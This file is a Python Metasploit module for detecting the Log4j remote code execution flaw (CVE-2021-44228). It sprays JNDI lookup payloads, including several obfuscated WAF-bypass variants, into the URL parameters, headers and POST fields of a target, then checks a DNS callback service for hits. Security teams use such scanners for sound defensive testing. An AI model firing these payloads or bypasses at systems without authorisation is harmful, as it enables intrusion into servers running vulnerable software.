#!/usr/bin/env python3
from metasploit import module

dependencies_missing = False
try:
    import random
    import requests
    import time
    from urllib import parse
    import json
    import random
except ImportError:
    dependencies_missing = True

metadata = {
    'name': 'log4j2 vulnerability scanner',
    'description': '''
    open detection and scanning tool for discovering and fuzzing for Log4J RCE CVE-2021-44228 vulnerability. This shall be used by security teams to scan their infrastructure for Log4J RCE, and also test for WAF bypasses that can result in achiving code execution on the organization's environment.
    ''',
    'authors': ["Taroballz", "ITRI-PTTeam"],
    'references': [
        {"type": "cve", "ref": "2021-44228"},
    ],
    'date': "2021-12-23",
    "type": "dos",
    "options": {
        'url': {'type': 'string', 'description': "target url", 'required':True, 'default': None},
        "dns": {"type": "string", "description": "the test dns server address", "required": False, "default": ""},
        "request_type": {"type": "string", "description": "request type: GET, POST, ALL", "required": False, "default": "GET"},
        "headers_file": {"type": "string", "description": "the path of the headers fuzzing list file", "required": True, "default": ""},
    }
}

default_headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
    'Accept': '*/*'
}

timeout = 4

class Dnslog():
    def __init__(self):
        self.s = requests.session()
        req = self.s.get("http://www.dnslog.cn/getdomain.php", timeout=30)
        self.domain = req.text

    def pull_logs(self):
        req = self.s.get("http://www.dnslog.cn/getrecords.php", timeout=30)
        return req.json()

def parse_url(url):
    url = url.replace('#', '%23')
    url = url.replace(' ', '%20')
    scheme = parse.urlparse(url).scheme
    file_path = parse.urlparse(url).path
    if file_path == '':
        file_path = '/'

    return {"scheme": scheme,
            "site": f"{scheme}://{parse.urlparse(url).netloc}",
            "host":  parse.urlparse(url).netloc.split(":")[0],
            "file_path": file_path}


def generate_waf_bypass_payloads(callback_host, random_string):
    payloads = []
    waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
                           "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
                           "${jndi:rmi://{{callback_host}}}",
                           "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
                           "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
                           "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
                           "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
                           "${jndi:dns://{{callback_host}}}"]
    for i in waf_bypass_payloads:
        new_payload = i.replace("{{callback_host}}", callback_host)
        new_payload = new_payload.replace("{{random}}", random_string)
        payloads.append(new_payload)
    return payloads


def get_fuzzing_headers(headers_file, payload):
    fuzzing_headers = {}
    fuzzing_headers.update(default_headers)
    with open(headers_file, "r") as f:
        for i in f.readlines():
            i = i.strip()
            if i == "" or i.startswith("#"):
                continue
            fuzzing_headers.update({i: payload})
    fuzzing_headers["User-Agent"] = default_headers["User-Agent"]

    fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
    return fuzzing_headers

def get_fuzzing_post_data(payload):
    fuzzing_post_data = {}
    post_data_parameters = ["username", "user", "email", "email_address", "password", "payload"]
    for i in post_data_parameters:
        fuzzing_post_data.update({i: payload})
    return fuzzing_post_data

def scan_url(headers_file,requestType, url, callback_host):
    parsed_url = parse_url(url)
    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for _ in range(7))
    payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
    payloads = [payload]
    payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
    for p in payloads:
        module.log(f"URL: {url} | PAYLOAD: {p}")
        if requestType.upper() == "GET" or requestType.upper() == "ALL":
            try:
                requests.request(url=url, method="GET",
                                 params={"v": p},
                                 headers=get_fuzzing_headers(headers_file, payload),
                                 verify=False,
                                 timeout=timeout,
                                 allow_redirects=False)
            except Exception as e:
                module.log(f"EXCEPTION: {str(e)}")

        if requestType.upper() == "POST" or requestType.upper() == "ALL":
            try:
                # Post body
                requests.request(url=url,
                                 method="POST",
                                 params={"v": payload},
                                 headers=get_fuzzing_headers(headers_file, payload),
                                 data=get_fuzzing_post_data(payload),
                                 verify=False,
                                 timeout=timeout,
                                 allow_redirects=False)
            except Exception as e:
                module.log(f"EXCEPTION: {str(e)}")

            try:
                # JSON body
                requests.request(url=url,
                                 method="POST",
                                 params={"v": payload},
                                 headers=get_fuzzing_headers(headers_file, payload),
                                 json=get_fuzzing_post_data(payload),
                                 verify=False,
                                 timeout=timeout,
                                 allow_redirects=False)
            except Exception as e:
                module.log(f"EXCEPTION: {str(e)}")


def run(args):
    if dependencies_missing:
        module.log("Module dependencies (requests) missing, cannot continue", level="error")
        return

    sURL = args['url']

    module.log(f"the target URL: {sURL}")

    if args['dns'] == "":
        dns_callback = Dnslog()
        dns_callback_host = dns_callback.domain
    else:
        dns_callback_host = args['dns']
    module.log(f"The test DNS server is '{dns_callback_host}'")

    scan_url(args['headers_file'], args['request_type'], sURL, dns_callback_host)

    if args['dns'] != "":
        module.log("Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.")
        return

    records = dns_callback.pull_logs()
    if len(records) == 0:
        module.log("Targets does not seem to be vulnerable.", "error")
    else:
        module.log("Target Affected", "good")
        for i in records:
            module.log(str(i), "good")


if __name__ == '__main__':
    module.run(metadata,run)